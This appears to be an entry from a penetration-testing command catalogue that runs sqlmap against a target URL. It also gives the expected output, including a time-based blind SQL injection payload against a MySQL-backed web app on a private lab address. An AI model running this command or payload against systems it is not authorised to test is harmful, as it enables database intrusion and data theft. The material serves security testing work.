---
id: 2e92ad83-b31f-480c-9ac8-60a1d725d252
name: SQLMap on URL Parameter
type: command
executor: ''
data: sqlmap -u http://$_Target_URL
output: "        ___\n        _H_\n ___ ___[(]__ __ ___ ___ {1.2.7#stable}\n|_ -|\
  \ . [)]    |.' || . |\n|___|_  [.]|_|_|_, ||  _|\n      |_|V          |_|  http://sqlmap.org\n\
  \n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual\
  \ consent is illegal. It is the end user's responsibility to obey all applicable\
  \ local, state and federal laws. Developers assume no liability and are not responsible\
  \ for any misuse or damage caused by this program\n\n[*] starting at 20:29:11\n\n\
  [20:29:11] [WARNING] provided value for parameter 'term' is empty. Please, always\
  \ use only valid parameter values so sqlmap could be able to run properly\n[20:29:11]\
  \ [INFO] resuming back-end DBMS 'mysql' \n[20:29:11] [INFO] testing connection to\
  \ the target URL\nsqlmap got a 302 redirect to 'http://192.168.1.9:80/vcart/login.php'.\
  \ Do you want to follow? [Y/n] y\nsqlmap resumed the following injection point(s)\
  \ from stored session:\n---\nParameter: term (GET)\n    Type: AND/OR time-based\
  \ blind\n    Title: MySQL >= 5.0.12 AND time-based blind\n    Payload: term=%' AND\
  \ SLEEP(5) AND '%'='\n---\n[20:29:14] [INFO] the back-end DBMS is MySQL\nweb application\
  \ technology: Apache 2.4.41, PHP 7.1.32\nback-end DBMS: MySQL >= 5.0.12\n[20:29:14]\
  \ [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.1.9'\n\
  \n[*] shutting down at 20:29:14"
created_at: '2020-07-29T15:13:49.461428+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# SQLMap on URL Parameter

```bash
sqlmap -u http://$_Target_URL
```

## Expected Output

```
        ___
        _H_
 ___ ___[(]__ __ ___ ___ {1.2.7#stable}
|_ -| . [)]    |.' || . |
|___|_  [.]|_|_|_, ||  _|
      |_|V          |_|  http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 20:29:11

[20:29:11] [WARNING] provided value for parameter 'term' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[20:29:11] [INFO] resuming back-end DBMS 'mysql' 
[20:29:11] [INFO] testing connection to the target URL
sqlmap got a 302 redirect to 'http://192.168.1.9:80/vcart/login.php'. Do you want to follow? [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: term (GET)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: term=%' AND SLEEP(5) AND '%'='
---
[20:29:14] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.41, PHP 7.1.32
back-end DBMS: MySQL >= 5.0.12
[20:29:14] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.1.9'

[*] shutting down at 20:29:14
```


